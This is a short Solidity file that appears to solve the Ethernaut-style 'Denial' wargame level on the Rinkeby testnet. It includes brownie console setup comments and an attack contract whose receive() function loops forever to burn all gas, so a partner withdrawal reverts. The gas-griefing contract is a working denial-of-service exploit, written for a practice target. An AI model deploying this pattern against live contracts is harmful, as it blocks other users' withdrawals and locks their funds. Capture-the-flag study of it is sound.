
/* 

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# Deploy attack contract

# call setWithfraePartner with attack contract address

# submit

# (OPTIONAL) call destroy()

*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;


interface Denial {

    function setWithdrawPartner(address _partner) external;
}


contract DenialAttack {


receive() external payable {

while (true) {
// consumes all the gas of the transaction which will cause the transaction to revert. preventing your partner from claiming ETH

    this;
    }

}

function destroy() external {

    selfdestruct(payable(msg.sender));
    }
}
